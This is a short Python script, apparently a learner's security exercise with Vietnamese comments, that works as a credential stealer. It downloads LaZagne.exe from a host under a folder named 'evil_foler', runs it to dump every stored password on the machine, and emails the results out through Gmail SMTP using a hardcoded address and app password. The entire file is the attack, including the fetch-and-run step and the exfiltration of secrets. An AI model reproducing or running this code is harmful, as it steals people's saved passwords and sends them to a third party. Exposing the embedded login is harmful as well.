import requests
import smtplib  # lib to send email
import subprocess


def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:  # wb = write byte
        out_file.write(get_request.content)  # read content of the request with byte format


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # create a smtp server ( gg server and it runs on port 587)
    server.starttls()  # Giao thức TLS (Transport Layer Security) là một giao thức bảo mật được sử dụng để bảo vệ
    # thông tin khi truyền qua mạng
    server.login(email, password)  # login email
    server.sendmail(email, email, message)
    # email(1) : from
    # email(2) : to
    # message : massage from email(1) to email(2)
    server.quit()  # close server


download("http://192.168.233.135/evil_foler/LaZagne.exe")
result = subprocess.check_output("LaZagne.exe all", shell=True)
send_mail("themadcat2012003@gmail.com", "ivergtlpqfmcudlg", result)
# lazagne is a tool can get information (password)
